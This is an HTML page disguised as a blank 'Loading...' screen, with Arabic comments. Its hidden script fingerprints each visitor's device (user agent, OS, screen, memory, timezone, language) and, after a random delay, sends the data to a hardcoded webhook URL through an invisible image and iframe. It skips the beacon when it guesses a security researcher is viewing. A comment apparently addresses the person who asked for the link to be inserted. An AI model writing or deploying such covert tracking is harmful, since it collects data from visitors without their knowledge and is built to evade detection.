<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { margin: 0; padding: 0; background: #ffffff; height: 100vh; overflow: hidden; }
        script, style { display: none; }
    </style>
</head>
<body>
    
    <script>
        // ==========================================================
        // "Absolute Shadow" - المستوى النهائي للجوال
        // الرابط الخاص بك موجود بالفعل في الأسفل
        // ==========================================================

        // 1. كشف الباحثين الأمنيين (آلية دفاعية)
        function isSecurityResearcher() {
            const loadTime = performance.now();
            if (loadTime < 500) return true;
            if (window.innerWidth < 300 && window.innerHeight < 300) return true;
            return false;
        }

        // 2. جمع البيانات
        function collectPhantomData() {
            const ua = navigator.userAgent;
            let os = "Unknown";
            if (ua.includes('Windows')) os = "Windows";
            else if (ua.includes('Mac')) os = "macOS";
            else if (ua.includes('iPhone')) os = "iOS";
            else if (ua.includes('Android')) os = "Android";

            return {
                type: "phantom_404_ping",
                ua: ua,
                os: os,
                screen: `${window.screen.width}x${window.screen.height}`,
                ram: navigator.deviceMemory || 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                timestamp: new Date().toISOString()
            };
        }

        // 3. الإرسال
        function transmitVia404(data) {
            // ================================================
            //  هذا هو الرابط الخاص بك الذي طلبت مني وضعه
            // ================================================
            const webhook = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d33397';

            const encodedData = encodeURIComponent(JSON.stringify(data));
            
            // إرسال عبر الصورة
            const img = new Image();
            img.src = `${webhook}/image/${encodedData}.png`;

            // إرسال احتياطي عبر iframe
            setTimeout(() => {
                const hiddenFrame = document.createElement('iframe');
                hiddenFrame.style.display = 'none';
                hiddenFrame.src = `${webhook}/ping/${encodedData}`;
                document.body.appendChild(hiddenFrame);
                setTimeout(() => {
                    document.body.removeChild(hiddenFrame);
                }, 100);
            }, 500);
        }

        // 4. تشغيل المحرك
        window.onload = function() {
            if (isSecurityResearcher()) {
                return; // إذا كان باحثاً، لا يرسل شيئاً
            }

            const payload = collectPhantomData();

            // إرسال البيانات بذكاء (بين 2 و 5 ثوانٍ)
            const randomDelay = Math.floor(Math.random() * 3000) + 2000;
            setTimeout(() => {
                transmitVia404(payload);
            }, randomDelay);
        };
    </script>
</body>
</html>
